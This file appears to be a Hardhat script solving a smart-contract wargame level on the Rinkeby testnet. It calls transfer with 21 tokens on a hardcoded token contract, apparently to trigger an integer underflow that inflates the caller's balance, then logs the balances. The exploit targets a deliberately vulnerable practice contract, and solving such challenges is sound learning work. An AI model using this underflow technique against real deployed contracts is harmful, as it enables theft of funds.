import { ethers } from "hardhat"
import { CoinFlip } from "../typechain-types"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x5451a7AfB37deADb6F1727d9837e28FCFF9Dd0Dd"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_initialSupply",
          type: "uint256",
        },
      ],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "_owner",
          type: "address",
        },
      ],
      name: "balanceOf",
      outputs: [
        {
          internalType: "uint256",
          name: "balance",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x70a08231",
    },
    {
      inputs: [],
      name: "totalSupply",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x18160ddd",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "_to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "_value",
          type: "uint256",
        },
      ],
      name: "transfer",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xa9059cbb",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const tx = await target.transfer(target.address, 21)
  const receipt = await tx.wait()

  console.log(
    `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
  )

  console.log(`Balance of owner ${await target.balanceOf(deployer.address)}`)
  console.log(`Total supply ${await target.totalSupply()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
